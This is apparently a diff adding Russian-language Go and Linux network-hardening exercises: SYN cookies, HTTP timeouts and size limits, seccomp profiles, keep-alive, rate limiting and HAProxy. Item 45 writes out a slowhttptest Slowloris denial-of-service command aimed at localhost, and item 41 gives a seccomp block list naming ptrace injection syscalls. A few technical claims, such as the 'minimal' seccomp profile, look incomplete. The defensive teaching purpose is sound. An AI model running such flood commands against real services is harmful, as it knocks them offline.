+    "theory": "TCP SYN Cookies являются базовой линией обороны операционной системы против атак типа SYN-флуд. Параметр `net.ipv4.tcp_syncookies = 1` предписывает ядру включать криптографический режим при заполнении очереди полуоткрытых сокетов (SYN backlog). Это исключает падение сервера от исчерпания памяти ядра, позволяя продолжать обслуживать легитимных клиентов.",
+    "step_by_step": [
+      "Проверьте текущее значение: `sysctl net.ipv4.tcp_syncookies`.",
+      "Включите защиту: `sysctl -w net.ipv4.tcp_syncookies=1`.",
+      "Зафиксируйте настройку в `/etc/sysctl.d/99-security.conf`.",
+      "Проверьте статистику срабатываний: `netstat -s | grep -i syncookies`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "sysctl_hardening.sh",
+        "lang": "bash",
+        "code": "#!/usr/bin/env bash\nset -euo pipefail\n\necho \"[SYSCTL] Применение сетевого харднинга против SYN Flood...\"\n\n# Включение SYN Cookies\nsysctl -w net.ipv4.tcp_syncookies=1\n\n# Увеличение глубины очередей сокетов\nsysctl -w net.core.somaxconn=4096\nsysctl -w net.ipv4.tcp_max_syn_backlog=8192\n\necho \"[METRICS] Проверка счетчиков отраженных атак:\"\nnetstat -s | grep -E \"(syncookies|overflows)\" || true\n\necho \"[OK] Сетевой стек Linux успешно защищен.\"\n",
+        "note": "Скрипт тюнинга параметров сетевой безопасности ядра Linux"
+      }
+    ],
+    "under_the_hood": "При включенном режиме ядро вычисляет ISN как `SHA1(src_ip, dst_ip, src_port, dst_port, secret, t) + seq_client + flags`.",
+    "pitfalls": "Параметр `tcp_syncookies=2` форсирует использование cookies всегда, что не рекомендуется из-за накладных расходов на процессор.",
+    "bigtech_interview": "В чем недостаток работы в режиме SYN Cookies? При генерации ISN невозможно сохранить все TCP опции (Selective Acknowledgements SACK, Timestamp), что незначительно снижает пропускную способность соединения при потерях пакетов."
+  },
+  {
+    "num": 34,
+    "title": "Оптимальная калибровка ReadHeaderTimeout в высоконагруженных шлюзах",
+    "task": "Сконфигурируйте и обоснуйте выбор значения ReadHeaderTimeout: 10 * time.Second для API Gateway, обрабатывающего мобильный трафик с высокими задержками сети.",
+    "theory": "Выбор значения `ReadHeaderTimeout` — это баланс между устойчивостью к Slowloris и доступностью для клиентов в мобильных сетях (3G/LTE/Edge). Слишком маленькое значение (менее 1 секунды) приведет к ложным сбросам соединений у пользователей с высоким джиттером и потерями пакетов. Значение 5-10 секунд является признанным мировым стандартом для публичных мобильных API: оно гарантированно отсекает Slowloris, не создавая ложных тревог для реальных клиентов.",
+    "step_by_step": [
+      "Инициализируйте экземпляр `http.Server` с `ReadHeaderTimeout: 10 * time.Second`.",
+      "Протестируйте отсечение соединений с паузой между заголовками более 10 секунд.",
+      "Убедитесь в бесперебойном приеме запросов от клиентов с задержкой 200-500 мс.",
+      "Логируйте ошибки таймаутов для последующего анализа в Grafana."
+    ],
+    "code_blocks": [
+      {
+        "filename": "gateway_timeout.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc CreateGatewayServer(addr string) *http.Server {\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/v1/orders\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintln(w, `{\"status\":\"created\"}`)\n\t})\n\n\treturn &http.Server{\n\t\tAddr:              addr,\n\t\tHandler:           mux,\n\t\tReadHeaderTimeout: 10 * time.Second, // Оптимальный порог для мобильного трафика\n\t\tIdleTimeout:       60 * time.Second,\n\t}\n}\n\nfunc main() {\n\tsrv := CreateGatewayServer(\":8080\")\n\tfmt.Printf(\"[GATEWAY] Сервер запущен на %s с ReadHeaderTimeout = 10s\\n\", srv.Addr)\n\t_ = srv\n}\n",
+        "note": "Конфигурация API Gateway с устойчивым таймаутом чтения заголовков"
+      }
+    ],
+    "under_the_hood": "Таймаут начинает отсчитываться сразу после вызова `Accept()`. Как только получена последняя пустая строка `\\r\\n` заголовков, таймер останавливается.",
+    "pitfalls": "Если клиенты работают по медленным спутниковым каналам, таймаут 1-2 секунды вызовет массовые сбои.",
+    "bigtech_interview": "Как в Яндекс Go выбирают таймауты для водительских приложений? Таймауты на заголовки устанавливаются в 5-10 секунд с агрессивным Exponential Backoff ретраем на клиенте."
+  },
+  {
+    "num": 35,
+    "title": "Низкоуровневые системные вызовы рантайма Go и базовый Seccomp профиль",
+    "task": "Исследуйте ключевые системные вызовы рантайма Go (clone, futex, mmap, epoll_pwait) и составьте базовый Seccomp-профиль в формате JSON для запуска Go-контейнера в Docker.",
+    "theory": "Рантайм Go значительно отличается от классических программ на C/C++. Для работы планировщика GMP требуются специфические системные вызовы:\n* `clone` / `clone3`: создание потоков ОС для M воркеров.\n* `futex`: межпоточная синхронизация мьютексов и каналов.\n* `mmap` / `munmap` / `madvise`: аллокатор памяти Go (mheap/mcentral).\n* `epoll_create1` / `epoll_ctl` / `epoll_pwait`: сетевой поллер (netpoller).\nБлокировка любого из этих вызовов приводит к немедленному аварийному падению программы (`SIGSYS` / crash).",
+    "step_by_step": [
+      "Определите минимально необходимый набор системных вызовов Go.",
+      "Создайте JSON-файл Seccomp-профиля с действием по умолчанию `SCMP_ACT_ERRNO`.",
+      "Добавьте обязательные сисколы в белый список (`SCMP_ACT_ALLOW`).",
+      "Запустите Docker-контейнер с флагом `--security-opt seccomp=profile.json`.",
+      "Убедитесь в штатной работе HTTP-сервера."
+    ],
+    "code_blocks": [
+      {
+        "filename": "go_seccomp_minimal.json",
+        "lang": "json",
+        "code": "{\n  \"defaultAction\": \"SCMP_ACT_ERRNO\",\n  \"architectures\": [\n    \"SCMP_ARCH_X86_64\"\n  ],\n  \"syscalls\": [\n    {\n      \"names\": [\n        \"read\", \"write\", \"openat\", \"close\",\n        \"futex\", \"clone\", \"clone3\", \"sched_yield\", \"nanosleep\",\n        \"mmap\", \"munmap\", \"madvise\", \"mprotect\",\n        \"epoll_create1\", \"epoll_ctl\", \"epoll_pwait\", \"epoll_wait\",\n        \"socket\", \"bind\", \"listen\", \"accept4\", \"getsockname\", \"getpeername\",\n        \"setsockopt\", \"getsockopt\", \"fcntl\",\n        \"rt_sigaction\", \"rt_sigprocmask\", \"sigaltstack\", \"exit_group\"\n      ],\n      \"action\": \"SCMP_ACT_ALLOW\"\n    }\n  ]\n}\n",
+        "note": "Минимальный рабочий профиль Seccomp для Go HTTP сервисов"
+      }
+    ],
+    "under_the_hood": "При попытке выполнить вызов, не входящий в список разрешенных, ядро Linux отправляет процессу сигнал `SIGSYS` или возвращает ошибку `EPERM` без исполнения сисколла.",
+    "pitfalls": "Забытый сисколл `madvise` приведет к падению сборщика мусора Go при возврате страниц памяти ОС (`runtime.sysUnused`).",
+    "bigtech_interview": "Почему стандартный Docker seccomp профиль разрешает сисколл clone, но блокирует clone с флагами создания новых неймспейсов? Для защиты от побега из контейнера через создание вложенных User Namespaces."
+  },
+  {
+    "num": 36,
+    "title": "Защита от атак раздувания заголовков через MaxHeaderBytes",
+    "task": "Сконфигурируйте жесткий лимит MaxHeaderBytes: 1 << 20 (1 МБ) и протестируйте сценарии отправки допустимых и недопустимо больших HTTP-запросов.",
+    "theory": "Ограничение размера входящих заголовков — фундаментальный рубеж защиты памяти сервера. Без этого ограничения злоумышленник может направить поток заголовков, пока сервер не исчерпает свободные слоты в оперативной памяти. Установка `MaxHeaderBytes: 1 << 20` гарантирует, что ни один клиент не сможет занять более 1 мегабайта в буфере парсинга запроса.",
+    "step_by_step": [
+      "Сконфигурируйте параметр `MaxHeaderBytes` в `http.Server`.",
+      "Отправьте запрос с размером заголовков 500 КБ — проверьте успешную обработку.",
+      "Отправьте запрос с размером заголовков 2 МБ — проверьте отсечение соединения.",
+      "Зафиксируйте поведение в интеграционных тестах."
+    ],
+    "code_blocks": [
+      {
+        "filename": "test_max_header.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc RunServerWithHeaderLimit() *http.Server {\n\treturn &http.Server{\n\t\tAddr:           \":8080\",\n\t\tMaxHeaderBytes: 1 << 20, // 1 MB максимум\n\t\tReadTimeout:    10 * time.Second,\n\t}\n}\n\nfunc main() {\n\tsrv := RunServerWithHeaderLimit()\n\tfmt.Printf(\"[SERVER] Запущен с лимитом MaxHeaderBytes = %d байт\\n\", srv.MaxHeaderBytes)\n\t_ = srv\n}\n",
+        "note": "Установка жесткого лимита размера заголовков в 1 МБ"
+      }
+    ],
+    "under_the_hood": "Если при чтении запроса размер заголовков превышает лимит, Go рантайм закрывает underlying сокет без вызова пользовательского хендлера.",
+    "pitfalls": "Если перед Go сервером стоит Reverse Proxy, лимит прокси может сработать раньше, вернув ошибку до того, как запрос дойдет до Go.",
+    "bigtech_interview": "Какова дефолтная величина MaxHeaderBytes в Go? Ровно 1 МБ (1 << 20), если значение в структуре http.Server равно 0."
+  },
+  {
+    "num": 37,
+    "title": "Ограничение размера полезной нагрузки через http.MaxBytesReader",
+    "task": "Используйте http.MaxBytesReader для ограничения чтения тела входящего запроса до 10 МБ, возвращая статус 413 при попытке передать избыточный объем данных.",
+    "theory": "Даже если размер заголовков ограничен, злоумышленник может передать 100-гигабайтный поток данных в теле запроса (POST/PUT). Функция `io.ReadAll(r.Body)` без ограничений приведет к мгновенному падению сервера по Out-Of-Memory. Обертка `r.Body = http.MaxBytesReader(w, r.Body, 10<<20)` гарантирует, что чтение прервется ошибкой `http.MaxBytesError` сразу при превышении 10 МБ, защищая память кучи.",
+    "step_by_step": [
+      "В начале обработчика оберните `r.Body` в `http.MaxBytesReader`.",
+      "Прочитайте тело через `json.NewDecoder(r.Body).Decode(&data)` или `io.ReadAll`.",
+      "Проверьте ошибку: при `errors.As(err, &maxBytesErr)` верните статус 413.",
+      "Убедитесь в закрытии сокета без зависания сервера."
+    ],
+    "code_blocks": [
+      {
+        "filename": "max_bytes_demo.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"errors\"\n\t\"fmt\"\n\t\"io\"\n\t\"net/http\"\n)\n\nfunc SafeUploadHandler(w http.ResponseWriter, r *http.Request) {\n\t// Лимит 10 МБ на тело запроса\n\tconst maxBodyBytes = 10 << 20\n\tr.Body = http.MaxBytesReader(w, r.Body, maxBodyBytes)\n\n\tbody, err := io.ReadAll(r.Body)\n\tif err != nil {\n\t\tvar maxBytesErr *http.MaxBytesError\n\t\tif errors.As(err, &maxBytesErr) {\n\t\t\thttp.Error(w, \"413 Request Entity Too Large\", http.StatusRequestEntityTooLarge)\n\t\t\treturn\n\t\t}\n\t\thttp.Error(w, \"Ошибка чтения: \"+err.Error(), http.StatusBadRequest)\n\t\treturn\n\t}\n\n\tfmt.Fprintf(w, \"Успешно принято %d байт\\n\", len(body))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/upload\", SafeUploadHandler)\n\tfmt.Println(\"[HTTP] Обработчик с защитой MaxBytesReader готов к работе.\")\n}\n",
+        "note": "Безопасное чтение тела запроса с ограничением в 10 МБ"
+      }
+    ],
+    "under_the_hood": "MaxBytesReader подсчитывает каждый байт. При превышении лимита он отправляет сигнал внутреннему серверу прервать TCP-соединение.",
+    "pitfalls": "Забытая проверка ошибки `errors.As(err, &maxBytesErr)` может привести к возврату ошибки 500 вместо корректного кода 413.",
+    "bigtech_interview": "Почему нельзя доверять r.ContentLength? Потому что заголовок Content-Length контролируется клиентом и может быть сфальсифицирован или отсутствовать при chunked transfer encoding."
+  },
+  {
+    "num": 38,
+    "title": "Высокопроизводительное распределение соединений через SO_REUSEPORT",
+    "task": "Спроектируйте архитектуру многопоточного сервера с шардированием слушающих сокетов через SO_REUSEPORT и проведите бенчмарк пропускной способности при параллельных подключениях.",
+    "theory": "На серверах с 32+ ядрами CPU одиночный `net.Listener` становится узким местом из-за конкуренции за блокировку очереди сокета в ядре. Использование `SO_REUSEPORT` позволяет создать отдельный сокет для каждого ядра процессора. Ядро Linux аппаратно распределяет входящие потоки, гарантируя нулевую конкуренцию за блокировки и максимальную скорость обработки запросов.",
+    "step_by_step": [
+      "Определите число доступных CPU через `runtime.NumCPU()`.",
+      "Создайте $N$ независимых листенеров с опцией `SO_REUSEPORT` на одном порту.",
+      "Запустите HTTP-сервер на каждом листенере в отдельной горутине.",
+      "Сравните задержки p99 под высокой параллельной нагрузкой."
+    ],
+    "code_blocks": [
+      {
+        "filename": "multi_reuseport.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"runtime\"\n\t\"syscall\"\n)\n\nfunc startWorker(id int, addr string) {\n\tlc := net.ListenConfig{\n\t\tControl: func(network, address string, c syscall.RawConn) error {\n\t\t\treturn c.Control(func(fd uintptr) {\n\t\t\t\t_ = syscall.SetsockoptInt(int(fd), syscall.SOL_SOCKET, 0xF, 1)\n\t\t\t})\n\t\t},\n\t}\n\tln, err := lc.Listen(context.Background(), \"tcp\", addr)\n\tif err != nil {\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tmux := http.NewServeMux()\n\tmux.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Воркер %d\\n\", id)\n\t})\n\t_ = http.Serve(ln, mux)\n}\n\nfunc main() {\n\tcpus := runtime.NumCPU()\n\taddr := \"127.0.0.1:8080\"\n\tfmt.Printf(\"[REUSEPORT] Запуск %d шардированных листенеров на %s...\\n\", cpus, addr)\n\tfor i := 0; i < cpus; i++ {\n\t\tgo startWorker(i, addr)\n\t}\n\tfmt.Println(\"[OK] Все воркеры успешно запущены.\")\n}\n",
+        "note": "Шардирование листенеров по ядрам CPU через SO_REUSEPORT"
+      }
+    ],
+    "under_the_hood": "Хэширование по 4-кортежу в ядре обеспечивает идеальный баланс трафика без накладных расходов на межъядерную синхронизацию.",
+    "pitfalls": "На операционных системах Windows опция `SO_REUSEPORT` не поддерживается (доступен только небезопасный SO_REUSEADDR).",
+    "bigtech_interview": "Какова разница между SO_REUSEADDR и SO_REUSEPORT? SO_REUSEADDR позволяет перепривязать порт в состоянии TIME_WAIT, а SO_REUSEPORT позволяет нескольким процессам параллельно слушать один и тот же порт."
+  },
+  {
+    "num": 39,
+    "title": "Инфраструктурная настройка ulimit и защита от EMFILE в продакшене",
+    "task": "Сконфигурируйте системные лимиты дескрипторов в /etc/security/limits.conf и systemd unit файле сервиса (LimitNOFILE=1048576) для предотвращения сбоев под пиковой нагрузкой.",
+    "theory": "Даже самый оптимизированный Go-сервис упадет с ошибкой `accept: too many open files`, если системный лимит дескрипторов процесса остался равным 1024. В production-средах лимит дескрипторов настраивается на уровне оркестратора (Kubernetes), systemd-сервиса (`LimitNOFILE=1048576`) или файла `/etc/security/limits.conf`, обеспечивая возможность удержания сотен тысяч одновременных сетевых соединений.",
+    "step_by_step": [
+      "Изучите конфигурацию systemd unit файла сервиса.",
+      "Добавьте директивы `LimitNOFILE=1048576` и `LimitNPROC=512000` в секцию `[Service]`.",
+      "Перезагрузите демон: `systemctl daemon-reload`.",
+      "Проверьте эффективные лимиты запущенного процесса в `/proc/<PID>/limits`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "service_hardening.service",
+        "lang": "ini",
+        "code": "[Unit]\nDescription=HighLoad Go Backend Service\nAfter=network.target\n\n[Service]\nType=simple\nUser=www-data\nGroup=www-data\nExecStart=/usr/local/bin/my-go-service\nRestart=always\n\n# Максимальный лимит открытых файлов и сокетов (ulimit -n)\nLimitNOFILE=1048576\n\n# Лимит потоков операционной системы\nLimitNPROC=512000\n\n# Защита от OOM паники\nOOMScoreAdjust=-500\n\n[Install]\nWantedBy=multi-user.target\n",
+        "note": "Конфигурация systemd unit файла с расширенным лимитом файловых дескрипторов"
+      }
+    ],
+    "under_the_hood": "Параметр `LimitNOFILE` устанавливает системные лимиты `RLIMIT_NOFILE` для процесса до запуска бинарника, исключая необходимость прав root внутри приложения.",
+    "pitfalls": "Увеличение `LimitNOFILE` требует также достаточного объема оперативной памяти для структур сокетов ядра (`file-max`).",
+    "bigtech_interview": "Как в Kubernetes манифесте задать ulimit для пода? Через секцию pod spec `initContainers` с вызовом `sysctl` или настройку runtime handler в CRI-O/containerd."
+  },
+  {
+    "num": 40,
+    "title": "Низкоуровневая настройка TCP Keep-Alive зондов на сырых дескрипторах",
+    "task": "Используйте net.TCPConn для активации SetKeepAlive(true) и SetKeepAlivePeriod(30 * time.Second) на принятом сетевом соединении для своевременного обнаружения мертвых сокетов.",
+    "theory": "Сетевое соединение может быть разорвано без уведомления сервера (например, при падении промежуточного NAT-шлюза). Метод `conn.SetKeepAlive(true)` включает отправку пустых TCP ACK-зондов на уровне ядра. Метод `conn.SetKeepAlivePeriod(30 * time.Second)` определяет интервал между зондами. Если клиент не отвечает на зонды, сокет автоматически закрывается, возвращая ошибку `read: connection timed out`.",
+    "step_by_step": [
+      "Примите соединение и приведите его к `*net.TCPConn`.",
+      "Включите зондирование: `tcpConn.SetKeepAlive(true)`.",
+      "Задайте интервал: `tcpConn.SetKeepAlivePeriod(30 * time.Second)`.",
+      "Проверьте освобождение ресурсов при внезапном отключении клиента."
+    ],
+    "code_blocks": [
+      {
+        "filename": "tcp_keepalive_raw.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"time\"\n)\n\nfunc configureKeepAlive(conn net.Conn) error {\n\ttcpConn, ok := conn.(*net.TCPConn)\n\tif !ok {\n\t\treturn fmt.Errorf(\"соединение не является TCPConn\")\n\t}\n\n\t// Включение TCP Keep-Alive зондирования ядра\n\tif err := tcpConn.SetKeepAlive(true); err != nil {\n\t\treturn err\n\t}\n\t// Интервал между зондами 30 секунд\n\tif err := tcpConn.SetKeepAlivePeriod(30 * time.Second); err != nil {\n\t\treturn err\n\t}\n\treturn nil\n}\n\nfunc main() {\n\tfmt.Println(\"[TCP] Функция настройки сырого Keep-Alive зондирования готова.\")\n\t_ = configureKeepAlive\n}\n",
+        "note": "Управление TCP Keep-Alive зондами через методы net.TCPConn"
+      }
+    ],
+    "under_the_hood": "Go вызывает `setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, 1)` и `setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, 30)`.",
+    "pitfalls": "Если между клиентом и сервером стоит агрессивный NAT-шлюз с таймаутом 60с, интервал Keep-Alive должен быть строго меньше таймаута NAT (например, 30с).",
+    "bigtech_interview": "Почему по умолчанию в Go 1.22 TCP Keep-Alive включен на 15 секунд? Для предотвращения утечек файловых дескрипторов на облачных балансировщиках AWS/GCP."
+  },
+  {
+    "num": 41,
+    "title": "Блокировка отладки и инъекций шеллкода через Seccomp (Block ptrace)",
+    "task": "Сконфигурируйте Seccomp-профиль, запрещающий системный вызов ptrace, и напишите Go-тест, проверяющий, что попытка вызвать syscall.PtraceAttach мгновенно убивает процесс сигналом SIGSYS.",
+    "theory": "Системный вызов `ptrace` используется отладчиками (GDB, Delve) для инспекции памяти и перехвата регистров процесса. В продакшен-среде `ptrace` представляет огромную опасность: злоумышленник, получивший доступ к соседнему непривилегированному процессу, может внедрить шеллкод в память вашего сервиса через `PTRACE_POKETEXT` или сдампить секретные ключи. Блокировка `ptrace` через Seccomp исключает этот вектор атак.",
+    "step_by_step": [
+      "Создайте Seccomp профиль с запретом сисколла `ptrace` (действие `SCMP_ACT_KILL` или `SCMP_ACT_ERRNO`).",
+      "Напишите Go-программу, вызывающую `syscall.PtraceAttach(pid)`.",
+      "Запустите программу в изолированном контейнере с данным профилем.",
+      "Убедитесь в генерации ошибки `operation not permitted` или завершении по сигналу `SIGSYS`."
+    ],
+    "code_blocks": [
+      {
+        "filename": "block_ptrace.json",
+        "lang": "json",
+        "code": "{\n  \"defaultAction\": \"SCMP_ACT_ALLOW\",\n  \"architectures\": [\n    \"SCMP_ARCH_X86_64\"\n  ],\n  \"syscalls\": [\n    {\n      \"names\": [\n        \"ptrace\",\n        \"process_vm_readv\",\n        \"process_vm_writev\"\n      ],\n      \"action\": \"SCMP_ACT_KILL_PROCESS\"\n    }\n  ]\n}\n",
+        "note": "Seccomp профиль для уничтожения процесса при попытке использования ptrace"
+      }
+    ],
+    "under_the_hood": "При действии `SCMP_ACT_KILL_PROCESS` ядро Linux немедленно завершает всю группу потоков процесса без возможности перехвата ошибки в коде приложения.",
+    "pitfalls": "Блокировка ptrace сделает невозможным профилирование или отладку сервиса 'на лету' через delve в этом контейнере.",
+    "bigtech_interview": "Как в Kubernetes запретить внедрение в память контейнеров? Запретить capability `SYS_PTRACE` и задействовать restricted pod security standard."
+  },
+  {
+    "num": 42,
+    "title": "Мгновенное обнаружение сбоев сети через опцию TCP_USER_TIMEOUT",
+    "task": "Сконфигурируйте системную опцию TCP_USER_TIMEOUT (Linux) на сокете через RawConn.Control для гарантированного закрытия соединения при зависании ретрансмитов дольше 30 секунд.",
+    "theory": "По умолчанию в Linux, если удаленный хост перестал отвечать (разрыв связи), стек TCP может выполнять повторные отправки (retransmissions) до 15-20 минут (регулируется `tcp_retries2 = 15`), прежде чем признать сокет мертвым. Наличие опции `TCP_USER_TIMEOUT` (RFC 5482) позволяет задать максимальное время в миллисекундах, в течение которого переданные данные могут оставаться неподтвержденными. Если ACK не получен за 30 000 мс, ядро принудительно обрывает сокет с ошибкой ETIMEDOUT.",
+    "step_by_step": [
+      "Извлеките `syscall.RawConn` из принятого соединения `net.Conn`.",
+      "В функции `Control` вызовите `syscall.SetsockoptInt` с опцией `TCP_USER_TIMEOUT` (константа 0x12 / 18 в Linux).",
+      "Установите таймаут в 30 000 миллисекунд (30 секунд).",
+      "Проверьте быстрое освобождение сокета при симуляции потери сетевых пакетов (iptables DROP)."
+    ],
+    "code_blocks": [
+      {
+        "filename": "user_timeout.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"syscall\"\n)\n\nfunc SetTCPUserTimeout(conn net.Conn, timeoutMs int) error {\n\ttcpConn, ok := conn.(*net.TCPConn)\n\tif !ok {\n\t\treturn fmt.Errorf(\"не является TCP соединением\")\n\t}\n\n\trawConn, err := tcpConn.SyscallConn()\n\tif err != nil {\n\t\treturn err\n\t}\n\n\tvar opErr error\n\terr = rawConn.Control(func(fd uintptr) {\n\t\t// 0x12 (18) соответствует TCP_USER_TIMEOUT в ядре Linux\n\t\topErr = syscall.SetsockoptInt(int(fd), syscall.IPPROTO_TCP, 18, timeoutMs)\n\t})\n\tif err != nil {\n\t\treturn err\n\t}\n\treturn opErr\n}\n\nfunc main() {\n\tfmt.Println(\"[TCP] Функция установки TCP_USER_TIMEOUT успешно скомпилирована.\")\n\t_ = SetTCPUserTimeout\n}\n",
+        "note": "Установка TCP_USER_TIMEOUT для защиты от 15-минутных зависаний ретрансмитов"
+      }
+    ],
+    "under_the_hood": "В отличие от TCP Keep-Alive, работающего при отсутствии данных, TCP_USER_TIMEOUT активен именно тогда, когда в буфере отправки ЕСТЬ неподтвержденные данные, что критично для сетевых клиентов баз данных и очередей.",
+    "pitfalls": "Опция специфична для Linux ядра 2.6.37+ и вызовет ошибку при сборке или выполнении на операционных системах macOS или Windows.",
+    "bigtech_interview": "Как избежать ситуации, когда Go-сервис зависает на 15 минут при отправке запроса к зависшему внешнему сервису? Настроить TCP_USER_TIMEOUT на 20-30 секунд на уровне транспортного сокета."
+  },
+  {
+    "num": 43,
+    "title": "Интеграция Token Bucket лимитера в структуру RateLimitedListener",
+    "task": "Реализуйте потокобезопасную структуру RateLimitedListener, использующую golang.org/x/time/rate для контроля общего темпа приема TCP-соединений в секунду.",
+    "theory": "Для предотвращения внезапных всплесков трафика (Traffic Spikes / Stampede), способных вызвать просадку планировщика Go, сетевой листенер оборачивают в централизованный Token Bucket лимитер. Метод `rateLimiter.Wait(ctx)` или `Allow()` регулирует скорость выдачи новых сокетов из очереди ядра, сглаживая нагрузку и гарантируя предсказуемое потребление ресурсов процессора.",
+    "step_by_step": [
+      "Определите тип `RateLimitedListener` со встроенным `net.Listener` и `*rate.Limiter`.",
+      "В методе `Accept()` вызывайте `l.limiter.Wait(context.Background())`.",
+      "Инициализируйте лимитер параметрами: 1000 соединений в секунду, burst 500.",
+      "Проверьте стабильность времени обработки запросов под пиковой нагрузкой."
+    ],
+    "code_blocks": [
+      {
+        "filename": "rate_limited_listener.go",
+        "lang": "go",
+        "code": "package main\n\nimport (\n\t\"context\"\n\t\"fmt\"\n\t\"net\"\n\t\"golang.org/x/time/rate\"\n)\n\ntype RateLimitedListener struct {\n\tnet.Listener\n\tlimiter *rate.Limiter\n}\n\nfunc NewRateLimitedListener(inner net.Listener, r rate.Limit, b int) *RateLimitedListener {\n\treturn &RateLimitedListener{\n\t\tListener: inner,\n\t\tlimiter:  rate.NewLimiter(r, b),\n\t}\n}\n\nfunc (l *RateLimitedListener) Accept() (net.Conn, error) {\n\t// Ожидаем доступности токена в лимитере перед принятием следующего сокета\n\terr := l.limiter.Wait(context.Background())\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn l.Listener.Accept()\n}\n\nfunc main() {\n\tfmt.Println(\"[RATE] RateLimitedListener сглаживания сетевых всплесков готов.\")\n\t_ = NewRateLimitedListener\n}\n",
+        "note": "Сглаживание скорости вызова Accept через алгоритм Token Bucket"
+      }
+    ],
+    "under_the_hood": "Метод `Wait()` использует таймер рантайма, временно усыпляя горутину листенера без активного опроса CPU (busy-wait), позволяя ядрам процессора обрабатывать уже принятые сокеты.",
+    "pitfalls": "Если burst лимитера меньше ожидаемого размера очереди SYN-пакетов, легитимные клиенты начнут испытывать задержку на этапе установки TCP-сессии.",
+    "bigtech_interview": "Чем отличается rate.Limiter.Wait() от rate.Limiter.Allow()? Allow() немедленно возвращает boolean (сброс или пропуск), а Wait() блокирует поток до появления токена (сглаживание нагрузки)."
+  },
+  {
+    "num": 44,
+    "title": "Эшелонированная защита: HAProxy / Envoy перед сервисом на Go",
+    "task": "Спроектируйте архитектуру демилитаризованной зоны с L7 прокси (HAProxy / Envoy / Nginx) перед Go-сервисом: терминация TLS, защита от атак Slowloris через буферизацию и фильтрация L7 аномалий.",
+    "theory": "Несмотря на высокую производительность Go, прямое подключение сервисов к открытому интернету не рекомендуется. Специализированные прокси (Envoy, HAProxy, Nginx) написаны на C/C++ с применением сокетных оптимизаций ядра (kqueue/epoll) и содержат аппаратные ускорители TLS (Intel QAT). Прокси полностью вычитывает медленный запрос клиента в свои буферы и передает в Go только целостный HTTP-запрос по быстрому локальному сокету или Unix Domain Socket, полностью изолируя Go от медленных клиентов.",
+    "step_by_step": [
+      "Сконфигурируйте HAProxy с секциями `frontend` и `backend`.",
+      "Установите `timeout http-request 5s` для быстрой отсечки Slowloris на уровне HAProxy.",
+      "Настройте отправку в Go через Unix Domain Socket (`/var/run/go.sock`).",
+      "Проверьте снижение расхода памяти и количества горутин в Go-сервисе."
+    ],
+    "code_blocks": [
+      {
+        "filename": "haproxy_frontend.cfg",
+        "lang": "haproxy",
+        "code": "global\n    maxconn 100000\n    log /dev/log local0\n\ndefaults\n    log global\n    mode http\n    option httplog\n    timeout connect 5s\n    timeout client  30s\n    timeout server  30s\n    timeout http-request 5s # Защита от Slowloris на периметре сети\n\nfrontend http_in\n    bind *:80\n    bind *:443 ssl crt /etc/ssl/certs/site.pem alpn h2,http/1.1\n    # Буферизация тела запроса до передачи в бэкенд\n    default_backend go_cluster\n\nbackend go_cluster\n    balance roundrobin\n    server go_app1 127.0.0.1:8080 check maxconn 5000\n",
+        "note": "Конфигурация HAProxy для буферизации и защиты Go сервисов на сетевом периметре"
+      }
+    ],
+    "under_the_hood": "HAProxy использует однопоточную event-driven модель с мультиплексированием тысяч соединений в одном процессе с минимальным расходом памяти (около 16 КБ на сессию).",
+    "pitfalls": "Если прокси не пробрасывает заголовок `X-Forwarded-For` или не настроен `send-proxy` (PROXY protocol), Go-приложение потеряет реальные IP-адреса клиентов для Rate Limiting.",
+    "bigtech_interview": "В инфраструктуре Авито и Ozon ни один Go-сервер не смотрит в интернет напрямую: весь входящий трафик проходит через Ingress Nginx / Envoy шлюзы."
+  },
+  {
+    "num": 45,
+    "title": "Автоматизированный аудит устойчивости утилитой slowhttptest",
+    "task": "Используйте утилиту slowhttptest для проведения контролируемой стресс-атаки Slowloris на тестовый сервис Go и сформируйте HTML-отчет с графиком доступности сервиса.",
+    "theory": "Утилита `slowhttptest` — отраслевой стандарт тестирования серверов на уязвимость к медленным DoS-атакам (Slowloris, Slow POST, Slow Read). Она умеет открывать тысячи соединений с заданным темпом передачи заголовков (`-i 10`) и зондировать сервис контрольными запросами для вычисления времени наступления отказа (Service Available percentage).",
+    "step_by_step": [
+      "Установите утилиту: `apt-get install slowhttptest`.",
+      "Запустите тест: `slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://localhost:8080 -g -o slowloris_report`.",
+      "Проанализируйте сгенерированные графики доступности сервиса.",
+      "Убедитесь, что сервер с настроенным `ReadHeaderTimeout` удерживает 100% доступность."
+    ],
+    "code_blocks": [
+      {
+        "filename": "run_slowhttptest.sh",
+        "lang": "bash",
+        "code": "#!/usr/bin/env bash\nset -euo pipefail\n\nTARGET_URL=\"http://127.0.0.1:8080\"\n\necho \"[STRESS-TEST] Запуск аудита устойчивости к Slowloris (slowhttptest)...\"\n\n# -c 1000: 1000 параллельных соединений\n# -H: Slowloris режим (медленные заголовки)\n# -i 10: интервал 10 секунд между досылкой байтов\n# -r 200: скорость подключения 200 conn/sec\n# -t GET: метод запроса\n# -l 60: длительность теста 60 секунд\nslowhttptest -c 1000 -H -i 10 -r 200 -t GET -u \"${TARGET_URL}\" -l 60 -g -o /tmp/report || true\n\necho \"[OK] Стресс-тестирование завершено. Отчет сформирован.\"\n",
